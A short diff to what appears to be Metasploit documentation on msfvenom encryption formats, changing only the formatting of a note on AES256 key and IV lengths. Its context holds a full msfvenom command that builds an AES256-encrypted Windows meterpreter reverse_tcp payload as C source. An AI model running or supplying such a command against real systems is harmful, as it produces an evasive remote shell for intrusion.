@@ -20,7 +20,7 @@ Framework Encryption Formats [--encrypt <value>]
 
 ## 01 - AES256
 
-**Note:** For AES256 encryption that the key (using flag `--encrypt-key`) must be exactly 32 bytes of length and the IV (using flag `--encrypt-iv`) must be 16 bytes of length
+Note: For AES256 encryption that the key (using flag `--encrypt-key`) must be exactly 32 bytes of length and the IV (using flag `--encrypt-iv`) must be 16 bytes of length
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt aes256 --encrypt-key 0123456789abcdefghijklmnopqrstuv --encrypt-iv 1234567890abcdef -f c -o payload_aes.c
